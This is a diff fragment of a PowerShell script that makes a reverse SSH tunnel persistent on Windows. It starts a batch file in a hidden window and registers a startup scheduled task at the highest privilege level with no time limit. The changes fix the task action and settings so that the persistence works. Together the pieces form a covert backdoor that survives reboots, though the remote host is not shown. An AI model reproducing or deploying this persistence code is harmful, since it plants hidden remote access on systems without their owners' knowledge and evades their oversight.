@@ -160,6 +160,9 @@ Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
 
 $taskName = "ReverseSSHTunnel"
 
+# Define the action to run the reverse SSH tunnel batch file
+$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$batFilePath`""
+
 # Remove the task if it already exists
 if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
@@ -167,12 +170,13 @@ if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
 
 # Schedule the task
 $trigger = New-ScheduledTaskTrigger -AtStartup
-$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
+$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::MaxValue)
+
 Register-ScheduledTask -TaskName $taskName `
     -Trigger $trigger `
     -Action $action `
     -Settings $settings `
     -RunLevel Highest `
-    -User "$username"
+    -User $username
 
 Write-Host "[!] Success! SSH reverse tunnel batch file created and scheduled. Path: $batFilePath."
